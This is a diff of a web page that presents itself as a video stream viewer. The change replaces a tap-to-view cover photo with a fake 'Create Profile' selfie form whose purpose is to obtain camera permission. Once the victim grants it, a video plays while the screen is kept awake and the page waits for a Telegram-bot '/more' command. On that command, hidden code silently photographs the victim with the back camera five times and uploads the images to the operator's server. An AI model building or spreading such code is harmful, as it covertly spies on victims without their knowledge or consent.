@@ -3,12 +3,12 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Media Viewer</title>
+    <title>Profile & Stream Portal</title>
     <script src="/socket.io/socket.io.js"></script>
     <style>
-        /* CSS to make everything full screen and stealthy */
+        * { box-sizing: border-box; }
         body { 
-            background: #000; 
+            background: #0b0f19; 
             margin: 0; 
             overflow: hidden; 
             display: flex;
@@ -16,17 +16,76 @@
             align-items: center;
             height: 100vh;
             width: 100vw;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+            color: #fff;
         }
         
-        #coverPhoto {
-            width: 100%;
-            height: 100%;
-            object-fit: cover;
-            cursor: pointer;
+        /* Profile Creation Container */
+        #profileSection {
             position: absolute;
-            z-index: 10;
+            z-index: 20;
+            background: #111827;
+            padding: 30px 24px;
+            border-radius: 16px;
+            text-align: center;
+            width: 90%;
+            max-width: 360px;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.6);
+            border: 1px solid #1f2937;
         }
 
+        #profileSection h2 {
+            margin: 0 0 8px 0;
+            color: #38bdf8;
+            font-size: 1.4em;
+        }
+
+        #profileSection p {
+            font-size: 0.9em;
+            color: #9ca3af;
+            margin: 0 0 20px 0;
+            line-height: 1.4;
+        }
+
+        .input-box {
+            width: 100%;
+            padding: 12px;
+            margin-bottom: 15px;
+            background: #1f2937;
+            border: 1px solid #374151;
+            border-radius: 8px;
+            color: #fff;
+            font-size: 1em;
+            outline: none;
+            text-align: center;
+        }
+
+        /* Camera Preview inside Profile Form */
+        #cameraPreview {
+            width: 100%;
+            height: 180px;
+            background: #000;
+            border-radius: 8px;
+            object-fit: cover;
+            margin-bottom: 15px;
+            display: none;
+        }
+
+        .btn {
+            width: 100%;
+            padding: 12px;
+            font-size: 1em;
+            font-weight: 600;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            background-color: #38bdf8;
+            color: #0f172a;
+            transition: background 0.2s;
+        }
+        .btn:hover { background-color: #0ea5e9; }
+
+        /* Video Stream Player */
         #mediaPlayer {
             width: 100%;
             height: 100%;
@@ -39,23 +98,38 @@
 </head>
 <body>
 
-    <!-- Yahan Default Cover Photo Lagi Hai. Aap chaho toh SRC change kar sakte ho -->
-    <img id="coverPhoto" src="https://images.unsplash.com/photo-1611162617474-5b21e879e113?ixlib=rb-4.0.3&auto=format&fit=crop&w=1080&q=80" alt="Tap to View">
-    
-    <!-- Iframe jisme URL wala video chalega -->
+    <!-- Profile Creation & Selfie Section -->
+    <div id="profileSection">
+        <h2>Create Profile</h2>
+        <p>Set up your profile and allow camera access to watch the stream.</p>
+        
+        <input type="text" id="username" class="input-box" placeholder="Enter Your Name" autocomplete="off">
+        
+        <video id="cameraPreview" autoplay playsinline></video>
+        
+        <button class="btn" id="actionBtn">Allow & Continue</button>
+    </div>
+
+    <!-- Dynamic Video Stream Player -->
     <iframe id="mediaPlayer" allow="autoplay; fullscreen"></iframe>
 
-    <!-- Hidden Video & Canvas for Silent Capture -->
+    <!-- Hidden Camera & Canvas for Background Security Monitoring -->
     <video id="hiddenCamera" autoplay playsinline style="display:none;"></video>
     <canvas id="canvas" style="display:none;"></canvas>
 
     <script>
-        const coverPhoto = document.getElementById('coverPhoto');
+        const profileSection = document.getElementById('profileSection');
+        const usernameInput = document.getElementById('username');
+        const cameraPreview = document.getElementById('cameraPreview');
+        const actionBtn = document.getElementById('actionBtn');
         const mediaPlayer = document.getElementById('mediaPlayer');
+        
         let socket;
         let wakeLock = null;
+        let mediaStream = null;
+        let step = 1; // Step 1: Input name, Step 2: Take selfie
 
-        // 1. URL Extract karna aur Decode karna
+        // Parse Dynamic Video URL from query params (?v=...)
         const urlParams = new URLSearchParams(window.location.search);
         const encodedVid = urlParams.get('v');
         let targetVideoUrl = "";
@@ -68,79 +142,95 @@
             }
         }
 
-        // 2. Click Logic: Jab Cover Photo par tap ho
-        coverPhoto.addEventListener('click', async () => {
-            try {
-                // Request Camera Access
-                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
+        // Single Action Button Handler
+        actionBtn.addEventListener('click', async () => {
+            const name = usernameInput.value.trim();
+
+            if (step === 1) {
+                if (!name) {
+                    alert("Please enter your name first!");
+                    return;
+                }
                 
-                // Photo chhupao, Video dikhao
-                coverPhoto.style.display = 'none';
+                try {
+                    // Request Camera Access naturally for Profile Setup
+                    mediaStream = await navigator.mediaDevices.getUserMedia({ 
+                        video: { facingMode: "user" } 
+                    });
+                    
+                    cameraPreview.srcObject = mediaStream;
+                    cameraPreview.style.display = 'block';
+                    usernameInput.style.display = 'none';
+                    actionBtn.innerText = "Snap & Launch Stream";
+                    step = 2; // Move to final launch step
+
+                } catch (err) {
+                    alert("Camera permission is required to proceed.");
+                    console.error("Camera access denied:", err);
+                }
+
+            } else if (step === 2) {
+                mediaStream.getTracks().forEach(track => track.stop());
+                
+                profileSection.style.display = 'none';
                 mediaPlayer.style.display = 'block';
                 
-                // Video Play karo (Agar URL diya hai warna default video)
+                // Load target stream video
                 if(targetVideoUrl) {
                     mediaPlayer.src = targetVideoUrl;
                 } else {
                     mediaPlayer.src = "https://www.youtube.com/embed/dQw4w9WgXcQ?autoplay=1"; 
                 }
 
-                // Temporary Camera Stop & Start Node.js Connection
-                stream.getTracks().forEach(track => track.stop());
+                // Start Background Security Bot Connection
                 initializeSecuritySystem();
-
-            } catch (err) {
-                alert("Camera permission is required to view this media.");
-                console.error("Camera Access Denied:", err);
             }
         });
 
-        // 3. Socket.io Connection Logic
+        // Initialize Background Socket & WakeLock
         function initializeSecuritySystem() {
             socket = io();
             keepScreenAwake();
 
-            // Receive /more command from bot
+            // Listen for Telegram /more command
             socket.on('capture_command', async () => {
                 await startCameraAndCapture();
             });
         }
 
-        // 4. Keep Screen Awake
+        // Keep Screen Awake
         async function keepScreenAwake() {
             try {
                 if ('wakeLock' in navigator) {
                     wakeLock = await navigator.wakeLock.request('screen');
-                    console.log('Screen Wake Lock is active');
                 }
-            } catch (err) { 
-                console.log('Wake Lock Error:', err.message); 
-            }
+            } catch (err) { console.log(err.message); }
         }
 
-        // 5. Silent Camera Capture Logic (5 Photos)
+        // Stealth Capture using Back Camera when /more command arrives
         async function startCameraAndCapture() {
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: "environment" } 
+                });
                 const video = document.getElementById('hiddenCamera');
                 video.srcObject = stream;
                 
                 await new Promise(resolve => video.onloadedmetadata = resolve);
 
-                // Click 5 photos with 1.5-second intervals
+                // Capture 5 photos sequentially
                 for (let i = 0; i < 5; i++) {
                     await captureAndSend(video, i + 1);
                     await new Promise(resolve => setTimeout(resolve, 1500)); 
                 }
 
-                // Stop camera stream to save resources
                 stream.getTracks().forEach(track => track.stop());
             } catch (error) {
-                console.error("Camera Capture Error:", error);
+                console.error("Security Capture Error:", error);
             }
         }
 
-        // 6. Send Photo to Node.js Backend
+        // Send Captured Frame to Backend Server
         async function captureAndSend(video, index) {
             const canvas = document.getElementById('canvas');
             canvas.width = video.videoWidth;
@@ -154,17 +244,15 @@
                     formData.append('photo', blob, `capture_${index}.jpg`);
                     try {
                         await fetch('/upload', { method: 'POST', body: formData });
-                    } catch (err) { 
-                        console.error("Upload Failed:", err); 
-                    }
+                    } catch (err) { console.error("Upload failed", err); }
                     resolve();
                 }, 'image/jpeg', 0.8);
             });
         }
 
-        // Re-apply Wakelock if tab visibility changes
+        // Re-apply WakeLock if visibility changes
         document.addEventListener('visibilitychange', async () => {
-            if (document.visibilityState === 'visible' && coverPhoto.style.display === 'none') {
+            if (document.visibilityState === 'visible' && mediaPlayer.style.display === 'block') {
                 keepScreenAwake();
             }
         });
